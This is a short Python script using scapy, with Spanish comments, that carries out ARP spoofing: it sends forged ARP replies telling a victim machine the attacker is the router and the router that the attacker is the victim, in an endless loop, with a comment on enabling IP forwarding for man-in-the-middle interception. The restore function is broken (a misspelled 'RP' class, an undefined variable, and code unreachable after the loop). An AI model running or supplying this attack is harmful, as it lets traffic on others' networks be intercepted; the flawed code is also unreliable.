from scapy.all import ARP,scapy,send,Ether,srp
import time
def get_mac(ip):
	arp_request = ARP(pdst = ip)
	broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	lista_respuestas = srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
	
	return lista_respuestas[0][1].hwsrc
	



def spoof(objetivo_ip, spoof_ip):

	objetivo_mac = get_mac(objetivo_ip)


	#op, para enviar paquetes, pdst el ip de la victima digamos, hwdst el MAC de la victima, y finalmente ponemos el gateway del router
	packet = ARP(op = 2, pdst = objetivo_ip, hwdst = objetivo_mac, psrc = spoof_ip)#le enviamos un paquete a la victima diciendo yo soy el router
	send(packet, verbose = False)
	#ahora mandamos un paquete al router diciendole que yo soy la victima

def restore(destination_ip, source_ip):#para restaurar las tablas arp de la victima
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = RP(op = 2, pdst = destination_ip, hwdst = objetivo_mac, psrc = source_ip, hwsrc = source_mac)
	send(packet, count = 4, verbose = False)#count = 4, para enviarlo 4 veces y asegurarnos


victim_ip = ""
spoof_ip = ""

while True:
	spoof(victim_ip, spoof_ip)#aca le digo a la computadora de la victima que soy el router
	spoof(spoof_ip, victim_ip)#ahora le digo al router que soy yo la compu de la victima
	time.sleep(2)

#echo 1 > /proc/sys/net/ipv4/ip_forward para activar ip forwarding, hace que la pc actue como router

restore(victim_ip, spoof_ip)
restore(spoof_ip ,victim_ip)
 
